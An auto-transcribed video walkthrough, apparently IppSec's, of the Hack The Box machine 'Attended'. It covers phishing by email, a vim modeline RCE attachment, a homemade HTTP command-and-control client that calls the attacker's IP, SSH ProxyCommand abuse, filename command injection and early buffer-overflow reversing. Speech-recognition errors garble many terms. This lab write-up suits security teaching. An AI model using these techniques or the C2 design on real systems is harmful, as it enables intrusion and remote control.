 what's going on youtube this is ipsec i can be doing attendant from hack the box which was an insane linux machine actually not linux it's open bsd but it starts off with a phishing exploit where you can send an email and get emails back through his messages you find out he's opening attachments in vim and there's an rce for vim back in 2019 that you can use to get code execution however it's not that simple because you can't just get a rev shell back because there's a firewall that blocks non-rfc compliant connections so you have to do a c2 over http as http gets or allowed but since it's open bsd it's hard to find an implant for it we're going to get into a lot of talk talking about c2s and make our own for this box which is pretty cool and once you get a shell on this you go up to the freshness user by exploiting a cron job and the freshness user gives you a binary that is a buffer overflow through ssh public keys and the binary itself has an insane rock chain that i can't explain right now so let's just get in and be amazed as always we're going to begin with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it attended and then the ip address which is 10 10 10 221. this can take some time to run so i've already ran it but instead of viewing this unless i did something i'm actually pretty proud of and if we just go look at my tmux config i have this bind key with capital c to send the keys to copy it into my clipboard because people say i just take too long to do notes so instead of removing the notes from my video i want to optimize it so now we can cat nmap attended.output i'm going to hit my special key which is control b and then capital c and magically it just goes into my clipboard so now inside of obsidian i can just paste that in and we have it already here so a little handy command to just speed up copy and paste there are only two ports open on this box ssh on port 22 and smtp on port 25. oddly enough the ssh isn't giving up the actual hostname its banner just says open ssh 8.0 which is a little bit unique for these hack the box machines and on port 25 smtp it is telling us the hostname is attended.htb we get a potential username and it's running open smtpd and if we go down a little bit we can see the help is saying please contact bugs at openbsd.org so we know that this box is running openbsd so we can take notes there and just put what we want so the user potential is gully the os open bsd and then finally the hostname is attended dot hdb so i'm going to go over into my host file so v at c host and we're going to add an entry here so 10 10 10 221 attended.htb and then i'm gonna do something a little bit unique that i haven't really done before i'm gonna set up iptables to show me whenever a box connects back to me and you'll see why we do this shortly it's not something i always set up but thinking about it it is something that could be good to do because it's going to show you whenever a machine connects back to you so you may miss shells and also show you if people ever initiate a connection to your machine which could mean you get detected on an engagement or maybe someone's attacking your box so it's just one of those cool things to have so this is gonna be an iptables rule it is going on the input and i just want it on tcp you can do tcp and udp if you want and then we're going to specify the state so m state dash state new and this is only going to show when a box connects to us initially it's not going to log if i connect to a box and then it comes back to me because that would be a established connection and things like that so this only shows when the box initiates a connection to me we're going to pipe it over to the log table and then we're going to give it the log prefix of iptables new dash connection so this is going to be how it shows up in the log and then just like this and we could also specify like i ton zero so it only takes effect on the interface ton xero so if i do sudo iptables dash l we can see that rule here and if i do a pseudo grep for iptables on vero log messages we don't have anything here yet i wonder if i do a nc 10 10 14 2 on port 9001 i doubt it's going to show up because this goes through like localhost and we specified ton xero but we'll see if this gets formatted soon so we do have a smtp server so looking at this smtp so i'm going to use a program called swaps to send mail so we're going to do swaps and then two gully at attended.htb and the reason we do gully is because the server says it's probably set up by him so i'm going to send it to him and then we'll say from we'll say ipsec at it doesn't really matter where we go uh ipsec get attended.htb we can say header and then subject vulnerability and then in the body i'm going to say hey check out a vulnerability because mail is insecure i put it on a web server so here i'm telling gully that to see a vulnerability in um his mail server he should go to my link so i'm going to link this to 10 10 14 2 and this is just like setting up pre-texting for something uh check out this vulnerability in your mail server and the next thing we do is the server so server 10 10 10 2 2 1. so i'm going to do sudo python 3 m http server on port 80 and then we'll send this message and wait about a minute i'm going to pause the video because it's like watching grass grow it's been well over a minute and he hasn't connected back to us so we know gully isn't clicking links if we look at a log file so sudo grep dash i iptables on viral log messages we can see there is a connection back to our computer that we just didn't accept because we weren't listening on the port here is the log prefix of iptable's new connection we can see the source is 10 10 10 2 2 1 destination is ourselves we can see the ttl and things like that but the main thing we're looking at is destination port which was sent from this has a destination port of 25 so he's trying to connect to port 25 on our machine which is the smtp port so what i'm going to do is stand up a web server because it looks like he's not a web server a smtp server because it looks like he's trying to send us mail and this is a really weird thing because it's generally not like how mail works but if he's trying to send it to our ip address let's let him so python3 dash m smtpd dash n c debugging server and then we can listen on all interfaces or we can just listen on the one we want i generally opt for the one i want and we're gonna have to run this with sudo and now we have a web server up actually i'm gonna do the web server in this pane because if i do it here i will be able to do control r and send the same exact message via swaps and what we can do is send it twice and i can press my magic key control b and c and it's going to send this right to the clipboard so while we wait for him to well he already responded but we can create a new message and say 10 emails and we have the command output here and if i want i can copy the swaps oh god there we go and we can copy this there we go so looking at what he sent us we do have something that says um let's see it's from attended let's go to the very top message follows so from attended to me from gully at attended.htb uh telling us thanks for writing he's busy working on an issue with freshness which could be a potential other user and dodging my email from everyone but him i'll get back in touch as soon as possible so it looks like um he's dodging emails from everyone but freshness so what we can do is use that zwox command again and let's say instead of ipsec it's going to be freshness and we still want to listen on our server and we can send this and waiting for the response back again it can take a minute so i'm just going to pause the video until it comes so it's been like 45 seconds which i think is the new minute and the cron sent us another email this time it's telling us we should send something so he's saying please double check your attachment it looks like i forgot to attach anything he's also telling us he's installed a basic python 2 environment on the gateway so we can proof of concept quickly to test outbound traffic restrictions uh it should stop any non-rfc compliant connection and the other hint is he's a vim power user and against proprietary email attachments however i'm going to still send him a docx so i'm going to touch test.x not going to put any content in here i just want to see how he reacts to it and we're going to do dash dash attach and then at test.docx and i'm going to wait for him to email us back i'm also going to copy this because in our notes while it was broke i ended up cleaning this up a little bit so we have 10 emails we have well 10 is my like organizational and the emails we have email one and then i'm going to do 11 email two and we can paste this and all we have to do is tell or put something up here that says email to and if we look here um let's see i have from ipsec so i'm going to just say from freshness and we look back it looks like uh he has responded and this time he's saying he's sorry but he can't read my attachment remember he's against proprietary um attachments so this is a hint that we probably should not use docx files i wonder if i can just copy this move file to make a copy email to one sweet so we can just quickly paste and say with docx attachment email three like that and say yeah that's fine so let's send him a vim file and looking at search point or exploit db and if we look at the vim if we do vim there is a exploit uh i could do search plate our box would be a little bit quicker uh here we go vim 81365 neovim it's 2019 so it's relatively recent and we've got code execution so let's take a look at this it looks like we create a poc uh psc.x or something this is what they open and this is the context and it will run it in um or run the command unnamed a so let's go over here now we can leave this smtp server running and create vim.txt i'm going to paste this and it's just going to run you name dash a there's no way for us to get this output back so we probably should make a request to us so what i'm going to do is a ping we can do ping 10 10 14 2 and what we should do is make sure it's dash c for count yep because we don't want to do an indefinite ping that would be very bad come on dash c1 there we go so now we have this attachment and we can say the attachment is vim.text and i'm going to do sudo tcp dump dash i ton 0 icmp and i'm also going to do a n so we can run this and we'll see if he ever pings us this looks like it is me pinging the gateway which i think is a script i have to get um milliseconds here it's not displaying but that is not to this box so let's wait for him to respond to her email and see if anything down here happens on tcp dumb and man that is annoying i gotta disable whatever i have pinging like every five seconds it looks like ah so we have him now sending an email message and we have a hit from 10 10 10 2 2 1. so what we could do is go to like a reverse shell for python but i'm not going to do that because uh let's see i think there was something he said you need rfc compliant connections which means you just it's a protocol filter on the firewall and a reverse shell doesn't follow any rfc or standard protocol so it gets dropped but he does say python 2 is here so we need to kind of just jump the gun and go for a python 2 command and what i'm going to do is take notes of what we just did so copy and we can say let's see make a copy this will be email for vim file and we can say this from freshness with text attachment okay so we want to create the vim and let's see cat pim.text this is the exploit we probably should do search boy but yeah let's just where's edit do this to be 20 give us some breathing room and go down here and say let's see uh we want to test if we can get a connection back to us and again i'm not going to test with a reverse shell because it just won't connect back to us and we just waste a few minutes of typing it out so let's create what is called a web cradle so in a vim file vm uh not test is it m.text i'm opening a vim poc and vim thankfully i'm updated uh let's see instead of ping i'm going to run python2 because he says he's got this and what we want to do is dash c for command and we're going to give a small thing that we can execute code with so we're going to do from base64 import b64d code and then we'll do a um exec and in python you can execute python code dynamically through either like eval or exec eval is expecting it just to be one line of python exact can be multiple lines so that's why i'm doing exact and if you're confused we just do python3 um exec print who am i it's just going to print who am i because it's running this code and this code prints who am i so that's all we're doing so exec and then we can say b64 b code and we need some base64. before we do that i just realized i missed one parenthesis we have the exec here and then b64 opening it and i only had one to close base64 so i'm just gonna put that there and then we can create a shell so let's do maker c2 eventually we're going to turn this into a c2 discussion but for now we just want to import request and then do request.get http 10 10 14 2 to make sure we can um resp get to us and let's see we can python 3 m http server 80 run it with sudo python3 client.pi okay it gets back to us so let's do base64-w0 on client.pi so now we have some base64 to execute and we can go over here and put that in so i'm going to move the web server down here because in this history i have the smtp debug server and down here we can launch the web server and here we do swaps and i'm going to wait about probably a minute because he's going to respond we'll see text fly here and then hopefully he'll make a request here and if he does that we can go into a talk about how to create a small c2 based upon http request and it looks like it hasn't come back to us yet so gonna pause the video until we oh no there we go so talked to long enough for him to do this and we verified we have execution because 10 101010221 is making a get request to us so this is where we're going to go into c2s and i think this section is going to be really cool i'm excited to talk about it because c2s are really complex when most people think they're just super simple and just use c2 incorrectly or just inefficiently so when most people think of c2 they think of a like web-based one where the client makes an http or https request to find tasking and then the server will either say there's no tasking or give it a command so if the server says no tasking the client sleeps for x seconds and that's generally 30 seconds and then you have a jitter and all the jitters there to do is randomize it some bit so if you remember a few minutes ago my tcp dump showed a ping every five seconds that's predictable you know that's some type of like machine doing it it's not a person so the jitter would just say not every 30 seconds let's just pick a random time between 30 and 90 seconds to make that request and the issue with doing this is if i sent a command right now i have to now wait between 30 and 90 seconds to get a response back because the client sleeps and then it makes a another request to get tasking the server says go run ipconfig client runs it and gives output and then sleeps so the disadvantage to this is it can be slow you issue a command and you wait you can change the timeout to low but if you change it too low then it becomes unstealthy because let's say we change it to every second we have five clients that's going to be five requests a second which i think turns into 300 a minute or 18 000 an hour and if anyone's looking at any log dns web etc that's going to stick out because you just can't go to a minute in that log without seeing the c2 domain and if you just look at like the number of dns requests per day this is going to be super high as well so everything is going to um show up the way around this is pretty simple and really cool once you look at it so this is the traditional and we're going to do a quote advanced and instead of the client sleeping it's going to be the server sleeping so i'm just going to paste this here so we have the client makes an http request to find tasking the server um has no tasks but keeps the http request open so the client doesn't sleep the server keeps it open and then operator gives task and server sends to client and client runs it gives output and makes requests immediately so the downside to this is if anyone's looking at like statistics even if it's https you'll see like an https session open for like 28 seconds but only 40 bytes was transferred that's weird because that server is just responding super slow so you have a lot of weird things with that but the advantage is the client's not going to make many requests to the server so in the volume of request this is super low and if you're interactively typing commands the chance of you getting detected anyways is pretty high and the time it takes someone to detect these abnormal http requests is going to be higher than if you just spam something so rc2 that we're going to create is going to be this advanced method so you can see it um to be slightly better organized we're going to create more notes which i know some people may not want so notes 2.txt to talk about the files we're going to make because our c2 for organization isn't going to be just one big file so we're going to have main.pi and that's purpose is going to be hold our command variable and then it's going to start terminal and then start listener and then we're going to have the terminal dot pi and this is just going to take command and update main.cmd and then we have a listener dot pi which is just going to be a web server and slash will hand out tasking if no tasking sleep there we go i want it on one line and then slash output will print to stdl so that's essentially going to be what we do so let's get rid of our notes and we can create main dot pi so we all we want to do is do cmd is equal to nothing and then if name is equal to main and we don't actually have to do this but clean python at all so if this is the main we want to do terminal stuff and web stuff so let's create terminal.pi and we can do was it from cmd import cmd i think like that and we can say class terminal cmd and prompt is equal to this and def for default um self ergs and we can do main.cmd is equal to args and we just have to import main so let's go back into main and see if this works so going to a terminal all we want to do is terminal is equal to terminal and then we want to do uh terminal.cmd loop and we have to import it so from terminal import star so if we do python 3 main we have something and i just want to change one thing and this prompt i want to put a space there okay so now we have that we have to create our web server now which we called listener.pi so this is going to do import main but before we import main we have to import a few things so from http.server import http server and base http request handler and then from socket server import threading mix n and import threading these libraries we're going to be using because python's built-in web server isn't threaded which means it only handles one request at a time which in our case would be very bad because we're like letting requests stay open so in order to accept multiple requests at once that's why we are doing this threading so all we do is class threading simple server threading mix in http server and we just pass this and we can do def of run and http is equal to threading simple server and then what we want to listen on 10 10 14 2 and then on port 80 and this is just standal standard um python http request code it's got a built-in handler if you do like python-m simple http server http server that's essentially this we're just um customizing the code a little bit so http serve forever okay so now we have a web server and if we go to main right now it's not gonna work so we can do our web stuff of um what is it we have to do uh import listener and is it listener.run yeah so we can say listener dot run it's not going to work because we're hanging right here so if i python 3 um actually let's just put a print here print starting web server okay so if we run main with sudo and didn't have typos in a code it never hits that print statement so what we have to do is put this terminal and a thread so go into main and say from threading import star and then we can say terminal thread is equal to thread target terminal dot cmd loop like that and then terminal thread.start so now this backgrounds this terminal command and if we run this man i am just typoing all over the place i should have noticed that was not highlighted uh already in use reset oh we have a webs over here there we go we see starting web server and if i go here and curl 10 10 14 2 we get a request so what we have to do now is handle the tasking so let's go back into our listener code and what we want to do is change this all up so we can hijack the get and eventually the log output info so let's create a class called handler and it's going to be base http request handler and then the do get is the function whenever this thing makes a get request so we can just say self.send response 200 self.end headers self dot w file dot right hello world um i think we need to encode this so we'll do b hello world like that and the next thing we do is go down here instead of base hdb handler we run our custom class so let's try this code see what happens we make a curl we're getting hello world awesome so now the next step is to handle the output so if we print self.path i think actually i'm just going to import pdb and pdb.set trace so we go into debug here and we run this code again now we're in pdb i can say self.path is slash if i continue we can say girl slash ipsec and then i can do self.path again and it's ipsec so we can determine what page we're on so i'm going to go back into my listener code and we're going to say try and if output in self.path handle output and let's go accept none and this is going to be if output is not there so we can say while main dot cmd is equal to nothing sleep .25 so a quarter of a second and i think that's good uh self.right we can say main.cmd dot n code and here we can just say main.cmd is equal to nothing so let's run this indented block line 12. uh if oops we just need to put something there okay so we're going to do a curl sleep is not defined so from time import sleep run this and now i'm going to curl and we see the request came here but the curl is staying open if i do ls it says ls and ends and that's what i mean about the um request staying open is it just stays open until you say something so the next annoying thing is the web server by default is printing the um log info of who gets it and we can easily remove that by just doing def log message self format ergs and we just return here so now we just silence the message we can print anything we want to customize the log message or if we just don't print anything it's not going to log so now when i run this we have this and i can say please leave a comment and soon as i type this that curl quest will finish and it says that awesome so the next piece we have to do is the um command portion so if output happens so we can say the request url is going to be equal to url purse on self.path and here we'll have to import a few things so from url lib.purse import url purse uh unquote plus and persqs um unquote plus if i you just use unquote um it's not going this is to like decode http a url thing and if i don't do the underscore plus it's not going to decode pluses so any space in the output is going to be a plus and just looks ugly so that's why that is there so a request url is going to be url purse self path and then we're going to do the parameters so request param is equal to first qs request url dot query and then we can do for i n request param and this variable is going to be in the client that we code essentially the output is going to be q equals cmd output so q and then print i dot strip and the strip is going to um not do line breaks so let's see what this looks like and before we do um actually i think we can just hand jam it so let's say curl on 10 10 14 2 it's waiting um i want to run echo please subscribe and then we got that so the next thing that would happen is it would do a curl 10 10 14 2 slash we called it output q equals please subscribe and then this should report just please subscribe yep we have it printing now it's printing on our like line here so i'm going to change that really quick and before this for loop or printing output i'm just going to print a blank line and this is like really bad code this isn't like it's more proof of concept so you understand it so now i can curl output um we need to let's see if output in self.path except so we should three like this and return i think uh let's see because what was happening is i did this please subscribe and it was hanging because it didn't have a command so now we fix that all about fixing the bugs so let's see that looks fine we have to go back to our client and right now it's just request.get very bare bone so if we want to execute commands we have to import a library to do that i'm just going to do the os library and then i'm also going to import a sleep here and you'll see why we do that in a second and then after the imports we're going to do a infinite loop so this is why we do a sleep because if the server isn't running um we don't want to peg the cpu so we're just going to sleep a quarter of a second here um it's not going to be like noticeable by running commands but if this did wasn't here and the server just didn't respond we could just do an infinite number of requests and peg the cpu which would be very bad so we want to do r is equal to request.get on this ip and then we can say output is it going to equal os dot p open r dot text this is going to be whatever the server sends back and then we just want to execute it like that and then we're going to say the payload is equal to q which is a parameter output which is the data and we're going to do request.get http 1010142 output and params is equal to payload now in a perfect world where i wasn't dealing with a super strict firewall all the output would go into a post because doing it this way putting all the parameters in the url i forget what the length limit is but you run into it eventually if it was a post we could have bigger request but the firewall is blocking post and it's just not fun to troubleshoot a firewall while recording so think taking that as to hindsight so we have the client let's try running our web server and then python3 um we're gonna go into c2 client.pi um we don't have payload equals so v client.pi payload equals that run it and if i do a who am i uh we get something to stand it out but we got ipsec uh if we do lsla we have output of that as well so it looks like our command is working as expected awesome so yeah i guess we can send this over into the email so i'm going to spin up main.pi we're going to do a base64 w0 on client.pi to grab this base64 oneliner and then we're going to add that into vim.txt vim.text and we'll edit this base64 to put our new web cradle in so now when i send this with swaps and he comes back to me we should get a hit back on this web server so oh shoot uh pdb uh yeah smtp debug forgot about that one let's just run this again just in case that minute passed so i'm waiting for output here of him replying to the email so he has now replied to the email and i didn't have anything to show me if a client connects this c2 but we can just run who am i and we get gully awesome whenever i hit enter it's doing the previous command so that's just an annoying thing inside of the cmd library instead of fixing that i'm just not going to worry about it i'm going to do lsla and we can get a list of files on this awesome if we look at g checker dot pi i do a cat there um maybe it's too big to be printed who am i we're still connected so we see gully i'm going to go into temp lsla and since i'm not using like a pty thing every command is a new session unfortunately so cdn stuff don't work so i'm just gonna do lsla on temp and we can see there is a dot config.swap and that file is pretty big if i do strings on.config.swap and we have to go into temp we can potentially get the output of this let's see strings dot slash tmp slash dot config dot swap there we go i don't know why i needed the dot slash there but we have this it looks like a ssh config so i'm going to copy this go over to obsidian um 25 need c2 notes and then 30 we need to um golly so if we go back to our emails let's see email for vim file he's saying if everything is fine you'll find a config file within minutes in the home shared folder and he'll test it as soon as possible so looking at this if we look the configs that probably go into that are going to be ssh configs because it's backwards but host is equal to star which is part of an ssh config user freshness control master things like that so one of the other features of ssh commands or ssh configs is a proxy command and the purpose of proxy command is to like proxy a command through a jump post so if we search proxy command ssh and let's see what is this uh proxy jump so imagine let's see proxy come on there we go proxy command so what the proxy command is going to do is ssh into remote host and then through that remote host run this command so we can abuse this proxy command by just running a reverse shell or the same c2 we're using currently so we're going to create a config so let's go um let's see if we can do i just did let's do pwd who am i golly pwd homegully okay let's try echo hoster to we'll call this ipsec.config and then let's cat ipsec.config and we see just her stars there so i'm going to echo proxy command and we want to grab our vim file so cat them dot text and the proxy command is going to be this python string so upon running ssh it's going to run this code so if we procs command that and i screwed that up so i'm going to redo this and we want to let's see probably put this in quotes so echo we need to put two spaces and we can grab everything up to here and two spaces because the config file you do hoster and then everything below it is a space so escape this quote oh man let's see this yeah and then escape the next quote okay and then we end the double quotes and we send this to ipsec.config if we cat ipsec.config we have this and there's actually spaces here um i bet if we xxd if xxd is here it will work but because of our unquote it's stripping their spaces so if we look for proxy command here we do have two spaces and this is a line break so we do have two spaces there now the next thing we have to do is run date because i don't want to run this in the same minute so i'm going to copy ipsec.config to home shared ipsec.config and we're going to give this some time to run gully exit close a web shell give it like five seconds and we're going to start this back up and the proxy command finished and then came back to us as freshness so the reason why i had to kill and restart the web shell is so gully died and freshness began if i didn't do that i have no way to switch sessions and i'll leave that up to a coding challenge to you to kind of improve how the c2 works if you want to use it but right now we have no such thing as sessions but we look at this we are freshness and we do lsla here we do have an ssh directory that we can write to so i'm going to go into dot ssh and if we had looked at gully we actually did not have that ability to write in here so with this ssh access i'm going to drop our key so we can get out of using this ghetto c2 thing so ssh dash keygen dash f i'm going to call it freshness and then cat freshness dot and we're going to grab this and we will echo this into dot ssh slash authorized keys and now if i ch mod 600 the private key sh-i freshness at freshness at 10 10 10 2 2 1. is it gonna let me in uh no what that's cat dot sh authorized keys it doesn't look like it added that's weird um i did terminate try this again okay now i did this and we have ipsec paired here okay let's try this again and i can log in as freshness via ssh so this is a good save point to get off of this c2 so let's clean this up and hope you enjoyed that and we can begin enumerating this directory and two things stick out the first one being this f checker dot pi because it's a python script so what's this doing in the home directory and we also have this off keys directory we know it's a directory from this and the weird thing is it's timestamp is off like june 28th and august uh or november 16th so there's like a five-month gap between these two things so it looks like it took the author a while to create this box so you had an idea of the box and changed things up but time stamps are always interesting to look at also we do have user.txt in 2019 and this is kind of like a meta thing with hack the box machines um this tells me it's in a vm because the flag rotation when machines boot up they should get a new user.txt in root.text but that process doesn't work on vms within machines based upon the previous machines that have released so this is kind of like a meta thing to be like oh i'm probably in a vm because this is an old flag also the flag is just before f checker.pi which is when this box probably was initially created so let's take a look at fchecker.pie and then we will look at november 16th and wait what yeah i'm surprised it doesn't show the year of 2020. yeah that that directory is just weird i'm gonna run stat on it real quick uh sorry i just got nerd sniped uh december 15 2020 so i'm guessing this is modified date of december 15th and created in november yeah okay i'm not sure why that doesn't have the year but let's get back to um analyzing f checker.pie because some python script should be easy to look at so we have the path being set to home shared and this is the path in the email and also we already dropped the config file so i'm guessing uh right off the bat this is gonna be what we use to get code execution then we have command user bin ssh dash l for user freshness dash capital f i don't know exactly what this is but it's an argument and 127.001 so i'm going to guess dash f means use this ssh config we're doing a loop and os.walk.path let's see here's c file so for every file inside of home shared it's going to do command percent c file and this percent c file is going to place the config here so this is definitely config and then it's doing a p equals subprocess dot p open on c so it's going to run this ssh with the config we dropped and then after like 0.2 seconds it's going to delete the config so that is this script it's how we got code execution on the box and eyeballing it there is a fun uh command injection vulnerability here um we don't have any um escaping around this so if you created a file with like um tesla test semicolon command here so like ping 10 10 14 2 it would probably ping us um let's see tcp dom i ton 0 icmp but actually done this so let's see we can touch that and then let's move this file into home shared and i didn't do a dash c uh let's see we'll see if it does ping it may not work and there may be other things we have to do but it looks like there's a command injection here because there's no sanitization and actually um let's put a another semicolon so what happened was i put a semicolon here and did ping 10 10 14 2 space 127.001 so i'm putting that second semicolon in my touch so it's going to terminate the ping and then we can say echo space there we go so let's move this file um move test ping echo space wow that is a ugly file but home shared let's see if this one works um maybe it doesn't but yeah i'm assuming there's command injection there we could play around with it more but we already executed commands so let's look at auth keys so we have a note dot text and what looks like a binary that we can't execute so if we tried to we can't i knew i couldn't execute it based upon the color i think it was executable it would be a maybe not because i don't see this f checker.pi is a different color and we have um execute because of the group so maybe the color is not working on this shell but let's look at note.text and oddly enough don't have a ping yet so i'd have to dig into that code more but whenever i see like a p open command and no standardization chances are we can do something naughty let's see on attended and unattended gateway so this is going back to say oh the uh flag rotation thing didn't happen so we are definitely in a vm we got two different machines here um enable auth keys command for sshd remove the source code so unattended source code has been removed and use nobody on attended gateway they have enabled auth keys command for sshd remove the source code but they have not stopped it from running as nobody so chances are we're our privileged user if we get on that so let's copy this off keys binary to our box and try to execute it so i'm just going to kill that as safe session switch this ssh with scp and we'll do off keys into off keys and down here wait did i not run this tcp dom uh i think we did get command injection but i never hit enter on the tcp dom and i didn't specify dash c1 so we have a constant ping um hold on a second let's do sh i freshness ps ef ps aux uh grep ping yeah so we do have it um i wonder if we have last dash s i don't know why how to get the rest of the command but you can see um the command injection certainly does work i just didn't hit enter and tcp dom uh it's the silly things and i wonder if i just broke the machine because no it's a subprocess so it runs as a fork or whatever so everything should still work um but that's why you generally always put dash c and your pings so let's go back here and do scp sorry for that like cyrant but auth key slash star off keys that should be fine maker off keys copy it and this is a bsd binary and i've never had luck using guidra's d compiler with bsd so i'm going to open up an ida let's see ida is actually installed in home ida or home ipsec ida ida 64. let's do okay we can do new and we want to open off keys off keys and yes 64-bit and here we go so we have a relatively small binary it looks like and if we look here we have compare our cx-5 and actually um before going into this and ida let's go and install bsd so we can execute this program because i don't think we can run a bsd program on linux so if we go cd off keys chmod plus x off keys oh we can i did not expect that i'm baffled at this running uh because it's a bsd thing and i did not expect it to be like cross-platform between bsd and linux it is doing seg faults which i don't know if that is standard behavior um we can check that by doing ssh and then going into auth keys and we can copy auth keys to let's say up one directory test sage mod plus x test and run this uh yeah we don't get seg faults and i think it also says evaluating key and on a linux machine uh let's see one two three four it never says that so um we're gonna have to install bsd because this is weird behavior but we can still prove out that um this five is going to be comparing registers or arguments and if this compare goes then it will not jump here so if there's not five arguments it's going to jump here which is just a exit out so we can look at this we don't see the final call i don't know why ida isn't showing it if we switch out a graphio i tried to make the text bigger and failed but after this xor it's going to syscall and oxdf had pointed this out both me and him like the day before doing this video um we spent like four hours playing with this binary to fully understand it so even though this video is going to be relatively short there's a lot of work that went into this buffer overflow which is it's a pretty cool one so that's why that exits let's go back to start so let's look at exactly what goes on here so if we have four arguments because remember the fifth or the very first one is the program name it's going to move forward into eax one into edi and then it's going to move this string so we can look at what this string is evaluating so i can name this to evaluating and if we go back to start it's going to move evaluating into rsi and then it's going to call this which i'm going to guess based upon this it's just doing syscall.right so all this function does is going to be um probably print rsi so print rsi is what we're going to call that um underscore sign there we go so it's going to print what's in that rsi register and then we're going to put 5 into cl which is the lower bit register for rcx i think it's lower bit anything assembly don't hold me too because i kind of make this up as i go if we do cl register maybe assembly registers talks into it so we can see cl is part of ecx so this is just like compiler optimization to reduce size or speed or whatever but moves five into this which is the counter register and now we're going to loop through each register or through each argument so it's going to decrement from five so it's going to argument four which i don't know which argument it does first but it's doing arguments one at a time and if it's not zero if rcx is not zero it's going to go down here if it is zero it goes here so we know rcx is going to be four right here so it's going to go down here and it's going to move rsi rbx into al and al is part of eax or rax i don't know exactly what it's doing it's going to increment rbx and i bet if we set a breakpoint here we'd be seeing it loop through what we put in the argument so we'll do that after we install um bsd so it's probably going to loop through each argument and then it's going to compare um what is there in rbx so that's why we moved that into al does i say early x bl i don't know exactly the register again don't quote me but it's moving the argument into this register and then it's going to increase by once or looping through each character until it gets to a null byte and if it's not a null byte it's going to go down here and go back to itself increment by one go to the next character check fits it all by and if it is a null byte it's going to go up here decrement to deckman rcx which goes to the next argument and go through the process until rcx is equal to zero and then once rcx is equal to zero it's going to go to this function um we have two print rsis i don't know is that actually still going to do that yep so it's going to print two things i hate how it keeps resizing but and let's see it's moving forward into eax and edi so i don't know exactly what this um variable is going over it says sorry uh it's not completed so not completed let's go back here and see what else let's see feel like i am missing a piece of this program oh we don't have this call so it's calling this function and if we look at this function it is somewhat bigger and it's doing a another loop and let's see what is here i don't know what these functions are looking at it it's doing a call and jump what is this call and jump so don't know exactly what those are we see another string here and looking at the string we have abcd efg all the way to z and then lowercase and then numbers and plus slash so this is going to be some type of base64 encoding most likely whenever you see this character set or at least that's what sticks out to me um it's giving you a complete character set to do some type of encoding so i'm going to assume this is going to be a base64 decode function we can say this is base64 and let's see i'm trying to follow this logic so it's going to go down here move this in here then we go all the way up go back down here and it's going to move this string into rdi and this string is actually going to be i think where the base64 value lives so i think they've hard coded this question mark so we'll come back to that one we can debug and step and it's copying 300 hex into rsp and this is where the actual overflow comes from the limit they have is 300 and we can actually put more than 300 there so that's where the overflow happens i know not explaining this super well um binary exploitation is not my strong suite so don't expect great explanations but hopefully it's good and that's what we kind of looked at in ida so let's go over to our bsd vm and i'm going to show the install process of this so let's go up to the top i'm going to do file new virtual machine do custom workstation and i don't feel like showing all the files on my host os so i'm just going to hand jam it in the iso for bsd at least the most current one on the website was install 69.iso it's bsd version 6.9 i believe so it's in my downloads directory and we'll click next um bsd is not an option so i'm just doing other free bsds here but bsd is not so i'm going to leave it at other 64-bit and we're going to call this open bsd um one process is fine 256 megs is fine i like doing it on bridge networking and then i'm just going to click next eight gigs is fine for disk space create this and we should be booting up and as long as i type the iso correctly we'll go into a install looks like we do and i'm going to view stretch guest free stretch so now that should be nice and big for you so let's see installation process let's just do i for install default keyboard layout first name um i'm going to call it attended just for kecks uh network sure dhcp sure yep it looks like you got a lease done password for root account is going to be password wants me type it again start ssh do i expect to run x windows system and i do not username no allow root login yes what time zone that's fine disk hole let's see auto layout is fine let's install uh path name sure it's a lot of hitting enters directory does not contain continue without verification yes and now we're going to install bsd so while this goes i'm going to pause the video and we'll wait till this is done which probably won't be long so now it's asking me for location of sets i'm just going to click done time appears wrong i could care less let's just do all defaults and it looks like it is going back to the install process so let's pause the video again and i'll resume it next time it gives us input so it looks like it's installed now it wants me to exit shell hot or reboot let's reboot and see what happens uh congratulations it is completed so let's boot up and hopefully once this goes in we can just sshn and be happy come on bsd boot up starting network we are 102. so i'm going to go over to parrot and we will try 192 168 1.102 was it looks like that's correct yes um doesn't seem to like my uh password authentication root password ifconfig and it is 102 so it doesn't want the password uh do we have 3 python 2 pkj add python3 can we add it looks like we can so i'm going to put a ssh key on this machine and then transfer it over to my machine via a web server so pkj add and bsd is how you install packages it's like app install so installing python so we can go into dot ssh sh keygen generating public private sure lsla let's oh chmod is already done we can move id rsa.pub to authorized keys and then i like to live dangerously so let's just stand up a web server and give out idrsa so let's go over to parrot and we can w get 192.168.1.102 id rsa i'm going to curl this because i know how to specify the output and i'll call this vm uh colon 8000 there we go sage mod 600 vm ss h i v m root at 192 168 1.102 there we go now we're root and a bsd machine we have awesome so the next thing to do is copy off keys over so another web server http server and what is this ip this is two thirty so w get 192 168 1.230 uh pkj add wget let's download it and once it installs w get 192.168.1.1 230 was it 230 8000 auth keys chmod plus x off keys and we are not segfaulting so we have gdb auth keys but gdb is a pain because i just like gaff so much more jeff whatever you pronounce it i know it says it on the github but i haven't read it in a while of his preferred way to pronounce it but it is a enhanced python thing do we have e-gdb e gdb we don't so we have to install enhanced gdb first because gdb doesn't have um python scripting so to install that i wonder if we just do a package add egdb and can't find it gdb let's see if this installs the correct one there we go this is the enhanced one that will have python scripting so now we go to gdb gef and let's go to install install and i know we just download a file let's see check setup this uh once git clone so i guess we should pkj add get and then we can get clone this in so just gotta wait for get to install git clone and then jeff.pie so ls jeff where's jeff.pi oh right there so jeff jeff.pi so i'm going to paste this and we're going to go slash root slash jeff jeff.pi into gdb inet if i do egdb we get this but we get a weird um unicode error i think this is because of just all their coloring and xct had pointed out a way to get this error removed and that is running export lc c type is equal to c dot utf-8 so now we can run egdb and we don't get that error message so all is good and the world um now let's go back over to ida where were we um we wanted to look at something so what do we want to do um see we can look at what this moves so we want to look at rdi right here so i'm going to break on 400 352 and as soon as i move my mouse it's going to go away but if you look down in that little bar um it's gray right oh no it didn't move right here this is where i get the address from alternatively you can hit space and then look at the function you're on but you can just go down there for a quick win so 400 352. so i'm going to break star 0x 400 was it 432 uh 400 352. okay run one two three and we're going to give it some base64 so echo please subscribe base64 dash w0 there we go i'm going to put this in the last argument uh we have to egdb dot slash off keys let's go back to that break run and we can see exactly where we are if we look at rdi so if we go up here we see rdi is um this location and that is pointed to all zeros right now x slash x yeah so if we step let's see when that gets populated i thought that would be um our base 64. and sorry let's see what he gets it's not complete yet he'll finish asap so not exactly sure what is going here so let's run this again and we hit the break point and rdi is zero so let's go and examine let's go 30 and see if we ever get to please subscribe so this is all nulls and i wonder if it's because it's expecting an ssh key so let's go back to start and right after this base64 let's see what happens because i don't know let's just see so 400 274 break stir 